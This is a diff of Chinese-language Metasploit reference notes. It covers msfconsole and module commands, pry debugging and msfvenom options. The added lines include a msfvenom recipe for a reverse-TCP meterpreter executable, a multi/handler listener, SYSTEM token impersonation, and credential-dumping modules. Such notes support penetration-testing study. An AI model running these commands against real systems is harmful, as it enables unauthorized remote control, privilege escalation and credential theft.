@@ -468,12 +468,16 @@
         * 启动msfconsole并查看数据库连接状态
             > msfconsole
             > db_status
+* `msfconsole`
+    * `-m <模块路径>`: 可指定自定义模块的搜索路径. (否则, 默认路径为`~/.msf4/modules`)
+    * `-q`: 静默, 不要打印开启动画. 
 * MSF命令
-    * `use <ruby脚本路径>`: 使用模块. 路径是相对于`/use/share/metasploit-framework/modules/exploits`的. 
+    * 模块命令
+        * `use <ruby脚本路径>`: 使用模块. 路径是相对于`/use/share/metasploit-framework/modules/exploits`的. 
         * `back`: 退出当前模块
-        * `edit exploit/zbh1.rb`: 编辑自定义的ruby脚本
         * `show targets`: 显示目标平台(操作系统)
         * `set target 0`: 选择第0项作为target
+        * `show exploits`: 列出可用EXP模块(包括自己添加的模块)
         * `show payloads`: 显示可用的shellcode
         * `show options`: 显示配置信息
         * exp常见配置选项: 
@@ -484,26 +488,37 @@
             * `set cmd calc`: 配置shellcode待执行的命令为'calc'程序
             * `set exitfunc seh`: 以seh退出程序
         * `exploit`: 发送测试数据, 执行攻击. 
+        * `reload_all`: 重载所有模块. 
+    * 载荷命令
+        * `check`: 检查目标是否可渗透. 
+        * `generate`: 生成载荷. 
+            * `-f <格式>`: 如base64, dll, hex, raw, java等
+            * `-e <编码器>`: 
+                * `x86/shikata_ga_nai`: 
+                * `x86/fnstenv_mov`: 变长
+                * `x86/nonalpha`: 不包含数字, 字母
+            * `-o <输出文件名>`: 
+            * `-b <坏字符>`: 指定一串需要避免的坏字符. 
+            * `-i <迭代次数>`: 设置迭代次数. 迭代次数越大, 载荷越大. 
+            * ``: 
+        * `reload`: 重载当前模块. 
+        * `to_handler`: 为制定的载荷创建一个句柄. 
+    * 任务命令
+        * `handler`: 开启一个载荷句柄, 运行任务
+        * `jobs`: 列出任务 
+            * `-k 2-6,7,8,11..15`: 停止任务
             * `-j`: 
         * `setg loglevel 3`: 设置日志级别为3(可在`~/.msf4/logs/framework.log`中看到详细的错误跟踪)
-        * `reload_lib <xxx/xxx.rb>`: 根据文件路径重载某ruby文件
-    * `show exploits`: 列出可用EXP模块(包括自己添加的模块)
-    * `jobs`: 列出任务 
-        * `-k 2-6,7,8,11..15`: 停止任务
-
     * 开发者命令
+        * `reload_lib <xxx/xxx.rb>`: 根据文件路径重载某ruby文件
         * `edit`: 编辑当前模块或文件
-        * `irb`: 打开交互式shell
-        * `log`: 显示`framework.log`文件内容
-        * `pry`: 在当前模块或框架中打开调试器. 
-        * `reload_lib`: 在当前模块或框架中打开调试器. 
-        * `time`: 
-
-* meterpreter
-    * 账户
-        * `getuid`: 
-        * `run windows/gather/credentials/windows_autologin`: 抓取自动登录的账号密码
-        * `run post/windows/gather/smart_hashdump`: 抓取自动登录的账号密码
+            * `edit exploit/zbh1.rb`: 编辑自定义的ruby脚本
+        * `loadpath <模块路径>`: 加载指定路径中的模块. 
+        * `irb`: 打开交互式shell. 
+        * `pry`: 在当前模块或框架中打开pry调试器. 
+        * `log`: 显示`framework.log`文件内容. 
+        * `time`: 显示执行一条命令的耗时. 
+        
 
 * msf模块
     * `auxiliary`: 辅助
@@ -520,8 +535,9 @@
     
     * 调试
         * 进入`/usr/share/metasploit-framework`, 执行`bundle config unset frozen`
-        * 编辑`Gemfile`, 加一行`gem 'pry-byebug'`
-        * 在要分析的地方加一行`binding.pry`, 即加上一个断点. 
+        * `gem install pry`, 安装`pry`包. 
+        * 编辑`Gemfile`, 加一行`gem 'pry-byebug'`. 在msf的根目录下, 执行`bundle install`, 安装`pry-byebug`. 
+        * 在要分析的地方加一行`binding.pry`, 即加上一个断点. 可以在后面接`if`语句, 达到条件断点的效果. 
         * 如果要进入`exploit`函数调试, 则要在其中打断点, 然后`set payload`设置一个载荷, 然后执行`run`. 
         * 如果要调试框架核心的代码, 需要在修改代码后重新载入文件. 
             * `load`和`require`加载库时搜索的路径保存在`$LOAD_PATH`列表中. 其中用的最多的路径就是msf下的`lib`. 
@@ -532,18 +548,21 @@
             * `up`: 沿着调用栈回溯到上一个调用的上下文
             * `down`: 反之
             * `next`: 执行下一行代码
+            * `step`: 进入
             * `finish`: 运行至函数返回
             * `continue`: 继续运行
             * `break`: 列出所有断点
                 * `break SomeClass#run`: 在`SomeClass#run`方法开始处中断.
                 * `break Foo#bar if baz?`: 当`baz?`为true时在`Foo#bar`方法处中断.
                 * `break app/models/user.rb:15`: 在`user.rb`的15行设置断点.
+                    * 文件路径应用绝对路径. 
                 * `break 14`: 在当前文件的第14行设置断点
                 * `break --condition 4 x > 2`: 给断点4设置条件.
                 * `break --condition 3`: 移除断点3处的条件.
                 * `break --delete 5`: 删除断点5.
                 * `break --disable-all`: 禁用所有断点
                 * `break --show 2`: 打印断点2的详情 
+            * `show-method <函数名>`: 列出函数的源码
     
     * 自定义exploit示例
         ```rb
@@ -603,7 +622,7 @@
     
 * 接口
     * 字符相关
-        * `pattern_create(<长度>)`: 生成用于定位的字符串
+        * `MSF::Exploit#pattern_create(<长度>)`: 生成用于定位的字符串. (实际调用了`Rex::Text.pattern_create`)
     * Rex模块(Ruby Extension): 
         * 其中包含了msf开发中所需要的功能模块
             * 大部分任务的基本库
@@ -611,21 +630,27 @@
             * SSL, SMB, HTTP, XOR, Base64, Unicode
         * `Rex::Assembly::Nasm`
             * `.assemble(assembly, bits = 32)`: 将汇编代码转为机器码
-            * `.disassemble(raw, bits = 32)`: 反汇编
+            * `.disassemble(raw, bits = 32)`: 反汇编. 可用`puts`打印该结果, 显示更美观. 
 
 * msfvenom: 整合了msfpayload和msfencode
     * `--list all`: 列出payloads, encoders, nops, platforms, archs, encrypt, formats等所有项的可用选项
     * `-x a.exe`: 以'a.exe'为可执行文件载荷的模板
     * `-b '\x00'`: 指定'\x00'为坏字符(会被编码器消除)
     * `-n <长度>`: 添加nop雪橇
-    * `-b `: 
-    * `-b `: 
     * `--payload windows/exec CMD=calc.exe 0`: 生成载荷, 'windows/exec'是载荷原型, 后面'CMD=calc.exe'是给参数'CMD'设置值. 0表示直接生成字符串, 可以选'C'等, 得到某一编程语言形式的载荷.
 
 * 后渗透模块
     * `meterpreter`:
         * metasploit的一类载荷, 如`windows/meterpreter/reverse_tcp`
+        * 使用
+            * 通过`msfvenom`生成一个回连马: `msfvenom -payload windows/meterpreter/meterpreter_reverse_tcp lhost="x.x.x.x" lport=4444 -f exe -o re.exe` (注意设置好回连的地址和端口)
+            * 把马`re.exe`放到目标机运行. 
+            * `msfconsole`
+                * `use exploit/multi/handler`
+                * 设置`LHOST`, `LPORT`
+                * `run`
         * 命令
+            * `shell`: 进入目标机器的cmd. 
             * `screenshot`: 截屏
             * `sysinfo`: 获取系统运行的平台
             * `ps`: 进程列表
@@ -638,9 +663,15 @@
             * `download <文件> <本地目录>`: 从目标机上下载文件到攻击机
             * `upload <文件> <目标机目录>`: 向目标机上传文件
             * `portfwd add -l <本机端口> -r <目标ip> -p <目标端口>`: 将目标机端口映射到本机来
-            * ``: 
+            * 列出会话令牌: 
+                1. `use incognito`
+                2. `list_tokens -u`
+            * `impersonate_toke "NT AUTHORITY\SYSTEM"`: 冒用`SYSTEM`的令牌. 
             * `getuid`: 获取当前用户信息
             * `getsystem`: 提权
+            * `run windows/gather/credentials/windows_autologin`: 抓取自动登录的账号密码
+            * `run post/windows/gather/smart_hashdump`: 抓取自动登录的账号密码
+        * 解决cmd乱码: 进入cmd后, 执行`chcp 65001`, 设置终端编码为`utf-8`. 
     * `post/windows/gather/enum_applications`
 
 * 安裝其他gem包: 在`/usr/share/metasploit-framework`下的Gemfile中, 添加`gem '<要安裝的包名>'`, 安装的包如pry, pry-byebug, pwntools等. 
